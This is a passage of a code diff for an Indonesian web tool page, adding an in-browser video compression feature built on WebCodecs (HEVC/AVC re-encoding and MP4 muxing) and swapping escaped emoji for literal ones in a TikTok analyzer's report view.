-                    </button>
-                    <button class="fcard" type="button" data-go="photo">
-                        <div class="ft">🖼️ Enhance Foto</div>
-                        <div class="fd">Pertajam foto: Detail, Structure, Sharpen, Denoise. Tiap fitur bisa diaktifkan/dimatikan sendiri.</div>
-                        <div class="fh"><b>Cara:</b> Pilih foto → atur toggle &amp; slider → Enhance → download.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                    <button class="fcard" type="button" data-go="resolution">
-                        <div class="ft">📐 Ubah Resolusi</div>
-                        <div class="fd">Perbesar foto ke Full HD, 2K, Ultra HD, atau ukuran kustom.</div>
-                        <div class="fh"><b>Cara:</b> Pilih foto → pilih resolusi → Perbesar → download.</div>
-                        <div class="fgo">Buka fitur →</div>
-                    </button>
-                </div>
-                <p class="howto-note" style="margin-top:16px;text-align:center;">Bingung cara pakainya? Chat langsung lewat TikTok atau Telegram di bagian atas halaman.</p>
+                <div class="home-clock"><div class="home-clock-time" id="dprClock" aria-label="Waktu sekarang">--:--:--</div></div>
             </div>
 
             <div class="tab-content" id="tab-patch">
@@ -782,6 +1071,54 @@
                     <div class="metadata-diff" id="resSummary"></div>
                 </div>
                 <p class="enc-note" style="margin-top:16px;">Fitur ini hanya mengubah ukuran piksel (upscale bertahap), tanpa mengubah Detail/Structure/Sharpen. Piksel bertambah, tapi detail baru tidak muncul karena bukan AI generatif. Foto tidak diperkecil dan tidak diupload.</p>
+            </div>
+
+            <div class="tab-content" id="tab-kompres">
+                <div class="upload-area" id="kvDrop">
+                    <div class="upload-icon">🗜️</div>
+                    <div class="upload-text">Pilih atau drop video</div>
+                    <div class="upload-hint">MP4 / MOV (H.264 atau H.265) · hasil tetap MP4</div>
+                    <input type="file" id="kvInput" accept="video/mp4,video/quicktime,.mp4,.mov,.m4v">
+                </div>
+                <div class="file-info" id="kvInfo">
+                    <div class="file-name" id="kvName"></div>
+                    <div class="file-size" id="kvMeta"></div>
+                </div>
+                <div class="form-group">
+                    <label for="kvCodec">Codec hasil</label>
+                    <select class="sel" id="kvCodec">
+                        <option value="hevc" selected>H.265 / HEVC (paling kecil, kualitas sama)</option>
+                        <option value="avc">H.264 / AVC (paling kompatibel)</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="kvLevel">Tingkat kompresi</label>
+                    <select class="sel" id="kvLevel">
+                        <option value="0.7">Ringan — ± 70% dari ukuran asli</option>
+                        <option value="0.5" selected>Seimbang — ± 50% dari ukuran asli</option>
+                        <option value="0.35">Kecil — ± 35% dari ukuran asli</option>
+                        <option value="custom">Target ukuran sendiri (MB)…</option>
+                    </select>
+                </div>
+                <div class="form-group" id="kvMBBox" style="display:none;">
+                    <label for="kvMB">Target ukuran file (MB)</label>
+                    <input type="text" class="tt-input" id="kvMB" inputmode="decimal" placeholder="contoh: 20">
+                </div>
+                <div class="form-group">
+                    <label for="kvSpeed">Kecepatan kompres</label>
+                    <select class="sel" id="kvSpeed">
+                        <option value="auto" selected>Otomatis — sesuai ukuran video &amp; kemampuan perangkat</option>
+                        <option value="medium">Medium — paling efisien, lebih lama</option>
+                        <option value="fast">Ultra Fast — cepat, file sedikit lebih besar</option>
+                        <option value="super">Super Ultra Fast — tercepat, file paling besar di antara ketiganya</option>
+                    </select>
+                </div>
+                <button class="btn btn-kv" id="kvBtn" disabled>🗜️ Kompres Video</button>
+                <button class="btn" id="kvCancel" type="button" style="display:none;margin-top:8px;background:#475569;">⏹ Batalkan</button>
+                <div class="status" id="kvStatus"></div>
+                <a class="download-btn" id="kvDl" download>⬇️ Download Video Terkompres</a>
+                <div class="metadata-diff" id="kvSummary"></div>
+                <p class="enc-note" style="margin-top:16px;">Resolusi, fps, rotasi dan audio asli dipertahankan (audio disalin tanpa diubah); yang diturunkan hanya bitrate video. Diproses di browser lewat WebCodecs, video tidak diupload. Kalau browser/perangkat tidak punya encoder H.265, otomatis dipakai H.264 dan diberi tahu. Video 10-bit/HDR belum didukung. Mode lebih cepat memakai encoder mode realtime (dan bitrate konstan di Super), jadi kualitas per ukuran sedikit turun; kecepatan nyata juga bergantung pada encoder hardware perangkat. Ukuran akhir adalah perkiraan; kalau sudah sangat terkompres, hasil bisa tidak lebih kecil dari aslinya.</p>
             </div>
 
             <div class="tab-content" id="tab-analyzer">
@@ -2378,7 +2715,7 @@
         }
         function ttEngagement(s) { if (!s || !s.play) return null; return ((s.like || 0) + (s.comment || 0) + (s.share || 0) + (s.collect || 0)) / s.play * 100; }
         function ttFmtCount(n) { if (n == null) return '-'; if (n >= 1e9) return (n / 1e9).toFixed(2) + 'B'; if (n >= 1e6) return (n / 1e6).toFixed(2) + 'M'; if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K'; return String(n); }
-        function ttFlag(cc) { cc = String(cc || '').toUpperCase(); return /^[A-Z]{2}$/.test(cc) ? String.fromCodePoint(127397 + cc.charCodeAt(0), 127397 + cc.charCodeAt(1)) : '\u{1F310}'; }
+        function ttFlag(cc) { cc = String(cc || '').toUpperCase(); return /^[A-Z]{2}$/.test(cc) ? String.fromCodePoint(127397 + cc.charCodeAt(0), 127397 + cc.charCodeAt(1)) : '🌐'; }
         function ttCountry(cc) { try { return new Intl.DisplayNames(['id'], { type: 'region' }).of(String(cc).toUpperCase()) || cc; } catch (e) { return cc; } }
         function ttMmss(s) { s = Math.round(s || 0); return Math.floor(s / 60) + ':' + String(s % 60).padStart(2, '0'); }
         const TT_CATS = [
@@ -2420,26 +2757,26 @@
             h += '<div class="rp-head">';
             if (m && m.cover) h += '<img class="rp-cover" src="' + anEsc(m.cover) + '" referrerpolicy="no-referrer" alt="" onerror="this.style.display=\'none\'">';
             h += '<div style="min-width:0">';
-            if (m && m.author) h += '<div class="rp-user">\u{1F464} ' + anEsc(m.author.id) + '</div>';
-            else h += '<div class="rp-user">\u{1F3AC} ' + anEsc(R ? R.fileName : 'Video') + '</div>';
-            if (m && m.createTime) h += '<div class="rp-date">\u{1F4C5} ' + anEsc(new Date(m.createTime * 1000).toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' })) + '</div>';
+            if (m && m.author) h += '<div class="rp-user">👤 ' + anEsc(m.author.id) + '</div>';
+            else h += '<div class="rp-user">🎬 ' + anEsc(R ? R.fileName : 'Video') + '</div>';
+            if (m && m.createTime) h += '<div class="rp-date">📅 ' + anEsc(new Date(m.createTime * 1000).toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' })) + '</div>';
             h += '</div></div>';
             if (m) {
                 const cap = String(m.title || '').trim();
                 const capHtml = cap ? cap.split(/(#[\p{L}\p{N}_]+)/u).map((p, i) => i % 2 ? '<span class="tag">' + anEsc(p) + '</span>' : anEsc(p)).join('') : '<i>(tanpa caption)</i>';
-                h += '<div class="rp-cap">\u{1F4DD} ' + capHtml + '</div>';
+                h += '<div class="rp-cap">📝 ' + capHtml + '</div>';
                 if (m.music && (m.music.title || m.music.author)) {
-                    h += '<div class="rp-sound">\u{1F3B5} <b>Sound</b>' + (m.music.duration ? ' \u2022 ' + ttMmss(m.music.duration) : '') + '<br><i>' + anEsc(m.music.title || m.music.author) + '</i></div>';
+                    h += '<div class="rp-sound">🎵 <b>Sound</b>' + (m.music.duration ? ' \u2022 ' + ttMmss(m.music.duration) : '') + '<br><i>' + anEsc(m.music.title || m.music.author) + '</i></div>';
                 }
                 const s = m.stats || {};
                 const n = v => (v == null ? '-' : Number(v).toLocaleString('id-ID'));
                 let st = '<div class="rp-stats">';
-                [['\u{1F441}\uFE0F', 'Views', s.play], ['\u2764\uFE0F', 'Likes', s.like], ['\u{1F4AC}', 'Komentar', s.comment], ['\u2B50', 'Favorit', s.collect], ['\u27A1\uFE0F', 'Share', s.share], ['\u2B07\uFE0F', 'Download', s.download]]
+                [['👁\uFE0F', 'Views', s.play], ['\u2764\uFE0F', 'Likes', s.like], ['💬', 'Komentar', s.comment], ['\u2B50', 'Favorit', s.collect], ['\u27A1\uFE0F', 'Share', s.share], ['\u2B07\uFE0F', 'Download', s.download]]
                     .forEach(x => { st += '<div class="rp-stat"><b>' + x[0] + ' ' + n(x[2]) + '</b><span>' + x[1] + '</span></div>'; });
                 st += '</div>';
                 const er = ttEngagement(s);
                 if (er != null) st += rpRow('Engagement', er.toFixed(2) + '%');
-                h += rpSec('\u{1F4CA} Statistik', st);
+                h += rpSec('📊 Statistik', st);
 
                 let inf = '';
                 if (m.id) inf += rpRow('ID Video', anEsc(m.id));
@@ -2466,7 +2803,7 @@
                     t += rpRow('Color space', anEsc(anColorSpace(V.color)));
                     t += rpRow('Durasi', anNum(C.duration, 2) + 's');
                     t += rpRow('Rotasi', (V.rotation || 0) + '\u00B0');
-                    h += rpSec('\u{1F9EA} Detail Teknis', t);
+                    h += rpSec('🧪 Detail Teknis', t);
                 } else if (A) {
                     h += rpSec('\u2B50 Kualitas &amp; File', rpRow('Ukuran file', (R.fileSize / 1048576).toFixed(1) + ' MB') + rpRow('Durasi', anNum(C.duration, 2) + 's') + rpRow('Audio codec', anEsc(A.codecName)));
                 } else if (ex.probe || ex.size) {
@@ -2480,7 +2817,7 @@
                 }
             }
             if (m) {
-                h += rpSec('\u{1F3F7}\uFE0F Kategori', rpRow('Kategori utama', anEsc(ttCategory(m.title))) + rpRow('Sumber', 'Analisis caption'));
+                h += rpSec('🏷\uFE0F Kategori', rpRow('Kategori utama', anEsc(ttCategory(m.title))) + rpRow('Sumber', 'Analisis caption'));
             }
             return h + '</div>';
         }
@@ -2554,7 +2891,7 @@
             const size = meta && meta.sizes ? meta.sizes[cand.key] : 0;
             const dur = (probe && isFinite(probe.d) && probe.d > 0) ? probe.d : (meta ? meta.duration : 0);
             document.getElementById('ttReport').innerHTML = ttReport(meta, null, { probe: probe, size: size, dur: dur });
-            let ck = '<p class="ck ck-ok">\u{1F517} Dianalisis langsung dari link \u2014 video tidak diunduh dan tidak disimpan.</p>';
+            let ck = '<p class="ck ck-ok">🔗 Dianalisis langsung dari link \u2014 video tidak diunduh dan tidak disimpan.</p>';
             if (probe && probe.w && probe.h) {
                 const ar = probe.w / probe.h, sh = Math.min(probe.w, probe.h);
                 if (Math.abs(ar - 9 / 16) < 0.01) ck += '<p class="ck ck-ok">\u2705 Rasio 9:16 (vertikal penuh) \u2014 pas untuk TikTok</p>';
@@ -2581,7 +2918,7 @@
             el.className = 'status';
             if (type) { el.classList.add('show', type); el.textContent = message; }
         }
-        const TAB_META = { home: ['🏠 Beranda', 0], patch: ['🎬 Patch Video MP4', 1], analyzer: ['🔍 Analyzer Video Internal', 1], tiktok: ['🎵 TikTok Analyzer', 1], ext: ['🧩 Download Ekstensi', 0], download: ['⬇️ Download Video', 0], apk: ['📱 Download APK', 0], photo: ['🖼️ Enhance Foto', 0], resolution: ['📐 Ubah Resolusi', 0] };
+        const TAB_META = { home: ['🏠 Beranda', 0], patch: ['🎬 Patch Video MP4', 1], analyzer: ['🔍 Analyzer Video Internal', 1], tiktok: ['🎵 TikTok Analyzer', 1], ext: ['🧩 Download Ekstensi', 0], download: ['⬇️ Download Video', 0], apk: ['📱 Download APK', 0], photo: ['🖼️ Enhance Foto', 0], resolution: ['📐 Ubah Resolusi', 0], kompres: ['🗜️ Kompres Video', 0], 'magic-link': ['🔑 Am Prem 1 Tahun', 0], 'am-finder': ['🔍 AM Finder', 0] };
         function activateTab(name) {
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.toggle('active', b.dataset.tab === name));
             document.querySelectorAll('.tab-content').forEach(c => c.classList.toggle('active', c.id === 'tab-' + name));
@@ -2622,7 +2959,7 @@
         async function runAnalysis() {
             if (!selectedFile) return;
             analyzeBtn.disabled = true;
-            showStatusEl(anStatus, 'loading', '\u{1F50D} Sedang menganalisis video...');
+            showStatusEl(anStatus, 'loading', '🔍 Sedang menganalisis video...');
             try {
                 await new Promise(r => setTimeout(r, 30));
                 const buffer = await selectedFile.arrayBuffer();
@@ -2667,14 +3004,14 @@
                 let meta = null, cand;
                 if (ttIsDirectVideo(url)) { cand = { key: 'direct', url }; window.__ttMeta = null; }
                 else {
-                    showStatusEl(ttStatus, 'loading', '\u{1F50E} Mengambil info video dari link...');
+                    showStatusEl(ttStatus, 'loading', '🔎 Mengambil info video dari link...');
                     meta = await ttResolve(url, signal);
                     window.__ttMeta = meta;
                     const cands = ttCandidates(meta, document.getElementById('ttQuality').value);
                     if (!cands.length) throw new Error('API tidak mengembalikan info video');
                     cand = cands[0];
                 }
-                showStatusEl(ttStatus, 'loading', '\u{1F4D0} Membaca resolusi video (tanpa mengunduh file)...');
+                showStatusEl(ttStatus, 'loading', '📐 Membaca resolusi video (tanpa mengunduh file)...');
                 const probe = await ttProbeVideo(cand.url);
                 if (signal.aborted) throw new Error('dibatalkan');
                 showLinkAnalysis(meta, cand, probe);
@@ -3286,8 +3623,8 @@
             const mdhd = (ts, dur) => full('mdhd', 0, 0, u32b(now), u32b(now), u32b(ts), u32b(dur), u16(0x55c4), u16(0));
             const hdlr = (type, name) => full('hdlr', 0, 0, z(4), enc(type), z(12), enc(name + '\0'));
             const dinf = box('dinf', full('dref', 0, 0, u32b(1), full('url ', 0, 1)));
-            const avc1 = box('avc1', z(6), u16(1), z(16), u16(P.W), u16(P.H), u32b(0x00480000), u32b(0x00480000), z(4), u16(1), z(32), u16(0x18), u16(0xffff),
-                box('avcC', P.avcC), box('colr', enc('nclx'), u16(1), u16(1), u16(1), new Uint8Array([0])), box('btrt', u32b(0), u32b(P.bitrate), u32b(P.bitrate)));
+            const avc1 = box(P.hevc ? 'hvc1' : 'avc1', z(6), u16(1), z(16), u16(P.W), u16(P.H), u32b(0x00480000), u32b(0x00480000), z(4), u16(1), z(32), u16(0x18), u16(0xffff),
+                box(P.hevc ? 'hvcC' : 'avcC', P.avcC), box('colr', enc('nclx'), u16(1), u16(1), u16(1), new Uint8Array([0])), box('btrt', u32b(0), u32b(P.bitrate), u32b(P.bitrate)));
             const keyList = []; P.vKeys.forEach((k, i) => { if (k) keyList.push(i + 1); });
             const vSizes = P.vSamples.map(s => s.length), aSizes = A ? A.sizes : [];
             const vTrak = (offs, is64) => box('trak', tkhd(1, Math.round(vSec * 1000), 0, P.matrix || ident, P.W, P.H),
@@ -3306,7 +3643,7 @@
             while (vi < nv || ai < na) { if (ai >= na || (vi < nv && vStart[vi] <= aStart[ai])) order.push(0, vi++); else order.push(1, ai++); }
             let total = 0; for (const s of vSizes) total += s; for (const s of aSizes) total += s;
             const is64 = total > 3.9e9;
-            const ftyp = boxWrap('ftyp', concat([enc('isom'), u32b(512), enc('isom'), enc('iso2'), enc('avc1'), enc('mp41')]));
+            const ftyp = boxWrap('ftyp', concat([enc('isom'), u32b(512), enc('isom'), enc('iso2'), enc(P.hevc ? 'hvc1' : 'avc1'), enc('mp41')]));
             const moov0 = buildMoov(new Array(nv).fill(0), new Array(na).fill(0), is64);
             const hdrLen = is64 ? 16 : 8;
             let pos = ftyp.length + moov0.length + hdrLen;
@@ -3469,6 +3806,200 @@
             };
         }
 
+        // ══════════════════════════════════════════════════════════════
+        // KOMPRES VIDEO — decode → encode ulang bitrate lebih rendah (H.265/HEVC atau H.264/AVC), resolusi & fps asli
+        // ══════════════════════════════════════════════════════════════
+        const KV_HEVC_LV = [[93, 983040, 33177600], [120, 2228224, 66846720], [123, 2228224, 133693440], [150, 8912896, 267386880], [153, 8912896, 534773760], [156, 8912896, 1069547520], [180, 35651584, 1069547520]];
+        function kvRev32(x) { let r = 0; for (let i = 0; i < 32; i++) { r = (r << 1) | (x & 1); x >>>= 1; } return r >>> 0; }
+        function kvHevcStr(d) {
+            const comp = ((d[2] << 24) | (d[3] << 16) | (d[4] << 8) | d[5]) >>> 0;
+            const con = Array.from(d.slice(6, 12)); while (con.length > 1 && !con[con.length - 1]) con.pop();
+            return 'hvc1.' + ['', 'A', 'B', 'C'][d[1] >> 6] + (d[1] & 31) + '.' + kvRev32(comp).toString(16) + '.' + (((d[1] >> 5) & 1) ? 'H' : 'L') + d[12] + '.' + con.map(b => b.toString(16).toUpperCase()).join('.');
+        }
+        async function kvPickHevc(W, H, fps, br, sp) {
+            const ps = W * H, sr = ps * fps;
+            for (const hw of sp.hw) for (const l of KV_HEVC_LV) {
+                if (l[1] < ps || l[2] < sr) continue;
+                const cfg = { codec: 'hvc1.1.6.L' + l[0] + '.B0', width: W, height: H, bitrate: Math.round(br), framerate: fps, latencyMode: sp.lat, hardwareAcceleration: hw, hevc: { format: 'hevc' } };
+                if (sp.cbr) cfg.bitrateMode = 'constant';
+                try { const r = await VideoEncoder.isConfigSupported(cfg); if (r && r.supported) return cfg; } catch (e) { }
+            }
+            return null;
+        }
+        const KV_SPEED = {
+            medium: { name: 'Medium', lat: 'quality', cbr: false, q: 6, fr: 2, key: 2 },
+            fast: { name: 'Ultra Fast', lat: 'realtime', cbr: false, q: 12, fr: 3, key: 3 },
+            super: { name: 'Super Ultra Fast', lat: 'realtime', cbr: true, q: 24, fr: 4, key: 4 }
+        };
+        function kvSpeedCfg(mode, totalPx) {
+            if (KV_SPEED[mode]) return Object.assign({ hw: ['prefer-hardware', 'no-preference'] }, KV_SPEED[mode]);
+            const pick = totalPx < 1e9 ? 'medium' : totalPx < 4e9 ? 'fast' : 'super';
+            const sp = Object.assign({ hw: ['prefer-hardware', 'no-preference'] }, KV_SPEED[pick]); sp.name = 'Otomatis → ' + sp.name; return sp;
+        }
+        // o: { codec:'hevc'|'avc', ratio:0..1 (dari bitrate video asli), targetMB:0 atau ukuran file target }
+        async function kvCompress(arr, dv, o, onProgress, ctrl) {
+            if (typeof VideoDecoder === 'undefined' || typeof VideoEncoder === 'undefined' || typeof OffscreenCanvas === 'undefined')
+                throw new Error('Browser belum mendukung WebCodecs — pakai Chrome/Edge/Safari terbaru');
+            const moov = findBox(parseBoxes(arr, dv, 0, arr.length), 'moov'); if (!moov) throw new Error('moov tidak ditemukan — bukan MP4/MOV valid');
+            let V = null, A = null;
+            for (const t of moov.children) {
+                if (t.type !== 'trak') continue;
+                const T = matttzReadTrack(arr, dv, t); if (!T) continue;
+                if (T.htype === 'vide' && !V) V = T; else if (T.htype === 'soun' && !A) A = T;
+            }
+            if (!V) throw new Error('track video tidak ditemukan');
+            const isH = (V.codec === 'hvc1' || V.codec === 'hev1'), isA = (V.codec === 'avc1' || V.codec === 'avc3');
+            if (!isH && !isA) throw new Error('Codec video sumber (' + V.codec + ') belum didukung; hanya H.264 / H.265');
+            const n = V.n;
+            if (n < 1 || n > 1000000 || V.deltas.length !== n) throw new Error('tabel frame video tidak valid');
+            const ck = anScanChildren(arr, dv, V.entryOff + 86, V.entryOff + V.entrySize).find(k => k.type === (isH ? 'hvcC' : 'avcC'));
+            if (!ck) throw new Error((isH ? 'hvcC' : 'avcC') + ' tidak ditemukan');
+            const conf = arr.slice(ck.cs, ck.end);
+            if (isH ? ((conf[17] & 7) + 8) > 8 : conf[1] >= 110) throw new Error('Video 10-bit/HDR belum didukung (warna bisa rusak)');
+            const dstr = isH ? kvHevcStr(conf) : 'avc1.' + matttzHex(conf[1]) + matttzHex(conf[2]) + matttzHex(conf[3]);
+            const srcW = dv.getUint16(V.entryOff + 32, false), srcH = dv.getUint16(V.entryOff + 34, false), ts = V.ts;
+            const pts = new Array(n); let acc = 0, pts0 = Infinity;
+            for (let i = 0; i < n; i++) { pts[i] = acc + (V.coffs ? V.coffs[i] : 0); acc += V.deltas[i]; if (pts[i] < pts0) pts0 = pts[i]; }
+            const dur = acc / ts, srcFps = acc > 0 ? n / dur : 30;
+            let vBytes = 0; for (const s of V.sizes) vBytes += s;
+            const aBytes = A ? A.sizes.reduce((a, b) => a + b, 0) : 0, srcBr = vBytes * 8 / dur;
+            let br = o.targetMB > 0 ? (o.targetMB * 1048576 - aBytes) * 8 / dur : srcBr * o.ratio;
+            br = Math.max(100e3, Math.min(br, srcBr * 0.95));
+            const sp = kvSpeedCfg(o.speed, srcW * srcH * n);
+            const dcfg = { codec: dstr, description: conf, codedWidth: srcW, codedHeight: srcH };
+            const ds = await VideoDecoder.isConfigSupported(dcfg).catch(() => ({ supported: false }));
+            if (!ds.supported) throw new Error('Decoder ' + (isH ? 'H.265' : 'H.264') + ' (' + dstr + ') tidak didukung browser/perangkat ini');
+
+            let decErr = null, encErr = null, decDone = false, enc = null, canvas = null, ctx = null, W = 0, H = 0, direct = false, outH = false;
+            const frames = [], vSamples = [], vKeys = [], vTsUs = [];
+            let encDesc = null, outIdx = 0, fw = 0, fh = 0, lastDurUs = 0;
+            const keyEvery = Math.max(1, Math.round(srcFps * sp.key)), t0 = performance.now();
+            const decoder = new VideoDecoder({ output: f => frames.push(f), error: e => { decErr = e; } });
+            decoder.configure(dcfg);
+            const check = () => { if (decErr) throw decErr; if (encErr) throw encErr; if (ctrl && ctrl.cancelled) throw new Error('dibatalkan'); };
+            const ensureEncoder = async f => {
+                fw = f.displayWidth; fh = f.displayHeight;
+                W = Math.round(fw / 2) * 2; H = Math.round(fh / 2) * 2; direct = (W === fw && H === fh);
+                let cfg = null;
+                if (o.codec === 'hevc') { cfg = await kvPickHevc(W, H, srcFps, br, sp); if (cfg) outH = true; }
+                if (!cfg) {
+                    const p = await matttzPickEncoderConfig(W, H, srcFps, br);
+                    if (p.error) throw new Error('Encoder di perangkat ini tidak mendukung ' + W + '×' + H + ' @ ' + Math.round(srcFps) + ' fps');
+                    cfg = p.cfg;
+                    const t = Object.assign({}, cfg, { latencyMode: sp.lat }); if (sp.cbr) t.bitrateMode = 'constant';
+                    try { const rs = await VideoEncoder.isConfigSupported(t); if (rs && rs.supported) cfg = t; } catch (e) { }
+                }
+                if (!direct) { canvas = new OffscreenCanvas(W, H); ctx = canvas.getContext('2d', { alpha: false }); ctx.imageSmoothingQuality = 'high'; }
+                enc = new VideoEncoder({
+                    output: (chunk, meta) => {
+                        if (vTsUs.length && chunk.timestamp <= vTsUs[vTsUs.length - 1]) { encErr = new Error('Encoder menghasilkan B-frame / urutan tidak berurutan (belum didukung)'); return; }
+                        const b = new Uint8Array(chunk.byteLength); chunk.copyTo(b);
+                        vSamples.push(b); vKeys.push(chunk.type === 'key'); vTsUs.push(chunk.timestamp);
+                        if (chunk.duration) lastDurUs = chunk.duration;
+                        if (!encDesc && meta && meta.decoderConfig && meta.decoderConfig.description) {
+                            const d = meta.decoderConfig.description;
+                            encDesc = (d instanceof ArrayBuffer) ? new Uint8Array(d.slice(0)) : new Uint8Array(d.buffer.slice(d.byteOffset, d.byteOffset + d.byteLength));
+                        }
+                    },
+                    error: e => { encErr = e; }
+                });
+                enc.configure(cfg);
+            };
+            const emit = async (hf, endUs) => {
+                while (enc.encodeQueueSize > sp.q) { check(); await matttzSleep(2); }
+                check();
+                const init = { timestamp: hf.timestamp, duration: Math.max(1, Math.round(endUs - hf.timestamp)) };
+                let vf;
+                if (direct) vf = new VideoFrame(hf, init); else { ctx.drawImage(hf, 0, 0, W, H); vf = new VideoFrame(canvas, init); }
+                enc.encode(vf, { keyFrame: outIdx % keyEvery === 0 }); vf.close(); hf.close(); outIdx++;
+            };
+            const feeder = (async () => {
+                for (let i = 0; i < n; i++) {
+                    while ((decoder.decodeQueueSize > sp.q + 2 || frames.length > sp.fr) && !decErr && !encErr && !(ctrl && ctrl.cancelled)) await matttzSleep(3);
+                    if (decErr || encErr || (ctrl && ctrl.cancelled)) return;
+                    decoder.decode(new EncodedVideoChunk({ type: (!V.stss || V.stss.has(i + 1)) ? 'key' : 'delta', timestamp: Math.round((pts[i] - pts0) * 1e6 / ts), data: arr.subarray(V.offs[i], V.offs[i] + V.sizes[i]) }));
+                }
+                await decoder.flush(); decDone = true;
+            })().catch(e => { if (!decErr) decErr = e; });
+            try {
+                let held = null, processed = 0;
+                for (;;) {
+                    check();
+                    if (!frames.length) { if (decDone) break; await matttzSleep(3); continue; }
+                    const f = frames.shift();
+                    if (!enc) await ensureEncoder(f);
+                    if (held) await emit(held, f.timestamp);
+                    held = f; processed++;
+                    if (onProgress && processed % 4 === 0) onProgress({ done: processed, total: n, sec: (performance.now() - t0) / 1000 });
+                }
+                if (held) await emit(held, held.timestamp + Math.round(V.deltas[n - 1] * 1e6 / ts));
+                if (!enc) throw new Error('tidak ada frame yang berhasil di-decode');
+                await enc.flush(); check(); await feeder; check();
+            } finally {
+                for (const f of frames) { try { f.close(); } catch (e) { } }
+                try { decoder.close(); } catch (e) { }
+                try { if (enc && enc.state !== 'closed') enc.close(); } catch (e) { }
+            }
+            if (!vSamples.length || !encDesc) throw new Error('encoder tidak menghasilkan data / konfigurasi');
+            if (!vKeys[0]) throw new Error('frame pertama hasil encode bukan keyframe');
+            const OUT_TS = 90000, vDurs = [];
+            for (let i = 0; i < vTsUs.length; i++) {
+                const a = Math.round(vTsUs[i] * OUT_TS / 1e6);
+                const b = i + 1 < vTsUs.length ? Math.round(vTsUs[i + 1] * OUT_TS / 1e6) : a + Math.max(1, Math.round((lastDurUs || (1e6 / srcFps)) * OUT_TS / 1e6));
+                vDurs.push(Math.max(1, b - a));
+            }
+            let audio = null;
+            if (A && A.n > 0 && A.deltas.length === A.n) audio = { ts: A.ts, entry: A.entry, sizes: A.sizes, deltas: A.deltas, parts: A.offs.map((off, i) => arr.subarray(off, off + A.sizes[i])) };
+            if (!outH) matttzFixLevel(encDesc, W, H, srcFps);
+            const blob = matttzMuxMp4({ W, H, matrix: V.matrix, avcC: encDesc, hevc: outH, bitrate: Math.round(br), vSamples, vKeys, vDurs, vTs: OUT_TS, A: audio });
+            const rot = matttzRotation(V.matrix), sw = (rot === 90 || rot === 270);
+            return { blob, outH, srcH: isH, fallback: (o.codec === 'hevc' && !outH), speed: sp.name, fps: srcFps, frames: vSamples.length, br, srcBr, audio: !!audio, seconds: (performance.now() - t0) / 1000, w: sw ? fh : fw, h: sw ? fw : fh, scaled: !direct };
+        }
+
+        (function () {
+            const $ = id => document.getElementById(id);
+            const drop = $('kvDrop'), inp = $('kvInput'), btn = $('kvBtn'), cancel = $('kvCancel'), st = $('kvStatus'), dl = $('kvDl'), sum = $('kvSummary'), lvl = $('kvLevel');
+            let file = null, outUrl = null, ctrl = null, busy = false;
+            lvl.addEventListener('change', () => { $('kvMBBox').style.display = lvl.value === 'custom' ? 'block' : 'none'; });
+            const clear = () => { dl.classList.remove('show'); sum.innerHTML = ''; if (outUrl) { URL.revokeObjectURL(outUrl); outUrl = null; } };
+            function load(f) {
+                if (!f || busy) return;
+                if (!/\.(mp4|mov|m4v)$/i.test(f.name)) { showStatusEl(st, 'error', '❌ File harus MP4 atau MOV'); return; }
+                if (f.size > 2e9) { showStatusEl(st, 'error', '❌ File terlalu besar (maks. ± 2 GB karena diproses di memori browser)'); return; }
+                file = f; clear(); inp.value = '';
+                $('kvName').textContent = f.name; $('kvMeta').textContent = formatSize(f.size);
+                $('kvInfo').classList.add('show'); btn.disabled = false; showStatusEl(st, '', '');
+            }
+            drop.addEventListener('click', () => inp.click());
+            drop.addEventListener('dragover', e => { e.preventDefault(); drop.classList.add('dragover'); });
+            drop.addEventListener('dragleave', () => drop.classList.remove('dragover'));
+            drop.addEventListener('drop', e => { e.preventDefault(); drop.classList.remove('dragover'); if (e.dataTransfer.files.length) load(e.dataTransfer.files[0]); });
+            inp.addEventListener('change', e => { if (e.target.files.length) load(e.target.files[0]); });
+            cancel.addEventListener('click', () => { if (ctrl) ctrl.cancelled = true; });
+            btn.addEventListener('click', async () => {
+                if (!file || busy) return;
+                busy = true; btn.disabled = true; clear(); ctrl = { cancelled: false }; cancel.style.display = 'block';
+                try {
+                    const custom = lvl.value === 'custom', mb = parseFloat(($('kvMB').value || '').replace(',', '.'));
+                    if (custom && !(mb > 0)) throw new Error('Isi target ukuran (MB) dengan angka');
+                    showStatusEl(st, 'loading', '⏳ Membaca video & menyiapkan encoder...');
+                    const buf = await file.arrayBuffer();
+                    const r = await kvCompress(new Uint8Array(buf), new DataView(buf), { codec: $('kvCodec').value, speed: $('kvSpeed').value, ratio: custom ? 0 : +lvl.value, targetMB: custom ? mb : 0 },
+                        p => showStatusEl(st, 'loading', '🗜️ Kompres: frame ' + p.done + '/' + p.total + ' (' + (p.done / p.total * 100).toFixed(0) + '%) · ' + (p.done / Math.max(p.sec, 0.1)).toFixed(1) + ' frame/dtk'), ctrl);
+                    outUrl = URL.createObjectURL(r.blob);
+                    dl.href = outUrl; dl.download = file.name.replace(/\.[^.]+$/, '') + '_compressed.mp4'; dl.classList.add('show');
+                    const saved = (1 - r.blob.size / file.size) * 100, bigger = r.blob.size >= file.size;
+                    showStatusEl(st, bigger ? 'error' : 'success', bigger ? '⚠️ Hasil tidak lebih kecil dari aslinya — video asli sudah sangat terkompres. Pakai file asli, atau pilih tingkat "Kecil".' : '✅ Selesai: hemat ' + saved.toFixed(0) + '% dalam ' + r.seconds.toFixed(0) + ' dtk');
+                    const row = (a, b) => '<div class="info-row"><span class="info-label">' + a + '</span><span class="info-value">' + b + '</span></div>';
+                    sum.innerHTML = row('Ukuran', formatSize(file.size) + ' → ' + formatSize(r.blob.size)) + row('Resolusi', r.w + '×' + r.h + ' (tidak diubah)') + row('FPS', r.fps.toFixed(0) + ' (tidak diubah)')
+                        + row('Codec', (r.srcH ? 'H.265' : 'H.264') + ' → ' + (r.outH ? 'H.265 (HEVC)' : 'H.264 (AVC)')) + row('Bitrate video', (r.srcBr / 1e6).toFixed(1) + ' → ' + (r.br / 1e6).toFixed(1) + ' Mbps') + row('Kecepatan', r.speed) + row('Audio', r.audio ? 'asli, tidak diubah' : 'tidak ada');
+                    if (r.fallback) sum.innerHTML += '<p class="enc-note">ℹ️ Perangkat/browser ini belum bisa meng-encode H.265, jadi dipakai H.264 (AVC). Coba Chrome/Edge terbaru atau Safari untuk H.265.</p>';
+                } catch (e) {
